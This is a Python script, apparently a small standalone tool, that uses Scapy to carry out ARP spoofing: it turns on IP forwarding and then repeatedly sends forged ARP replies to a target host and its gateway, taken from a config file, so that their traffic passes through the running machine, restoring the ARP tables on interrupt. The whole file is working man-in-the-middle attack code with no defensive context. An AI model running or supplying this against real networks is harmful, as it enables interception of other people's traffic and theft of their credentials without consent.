from scapy.all import ARP, send, get_if_hwaddr
import json
import time


def spoof_arp(target_ip, target_mac, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=get_if_hwaddr(interface))
    send(packet, verbose=False)

def enable_ip_forwarding():
    import platform
    if platform.system() == "Linux":
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
    elif platform.system() == "Darwin":
        import subprocess
        subprocess.run(["sysctl", "net.inet.ip.forwarding=1"])
    else:
        print("OS not supported. Your OS is : ", platform.system())
        print("Please enable IP forwarding manually.")
    
def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
    packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
    send(packet1, count=4, verbose=False)
    send(packet2, count=4, verbose=False)
    print(f"Restored ARP tables for {target_ip} and {gateway_ip}")


if __name__ == "__main__":
    with open("config.json") as config_file:
        config = json.load(config_file)

    target_ip = config["ip_target"]
    target_mac = config["mac_target"]
    gateway_ip = config["ip_gateway"]   
    gateway_mac = config["mac_gateway"]
    interface = config["interface"]

    enable_ip_forwarding()

    try:
        while True:
            spoof_arp(target_ip, target_mac, gateway_ip)
            spoof_arp(gateway_ip, gateway_mac, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)
        